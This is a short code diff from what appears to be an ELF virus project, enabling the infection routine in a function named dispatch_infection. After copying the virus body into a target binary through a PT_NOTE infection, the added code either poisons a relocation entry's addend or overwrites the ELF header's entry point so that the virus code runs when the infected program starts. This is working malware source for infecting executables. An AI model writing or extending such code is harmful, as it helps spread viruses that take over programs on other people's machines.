@@ -248,6 +248,8 @@ clean_up:
 int dispatch_infection(Elfbin *target)
 {
 	Elf64_Rela desired_relocation;
+	Elf64_Rela *mod_reloc;
+	Elf64_Ehdr *hdr;
 	uint8_t *insertion;
 
 	bool use_reloc_poison;
@@ -265,11 +267,15 @@ int dispatch_infection(Elfbin *target)
 	pt_note_infect(target);
 	insertion = (uint8_t *)(target->write_only_mem + target->vx_offset);
 	anansi_memcpy(insertion, target->vx_start,target->vx_size);
-	/*
-	if(use_reloc_poison) {
 
+	if(use_reloc_poison) {
+		mod_reloc = (Elf64_Rela *)(target->write_only_mem + target->desired_rela_offset);
+		mod_reloc->r_addend = target->vx_vaddr;
+	}else {
+		hdr = (Elf64_Ehdr *)(target->write_only_mem);
+		hdr->e_entry = target->vx_vaddr;
 	}
-	*/
+
 	return 0;
 }
 
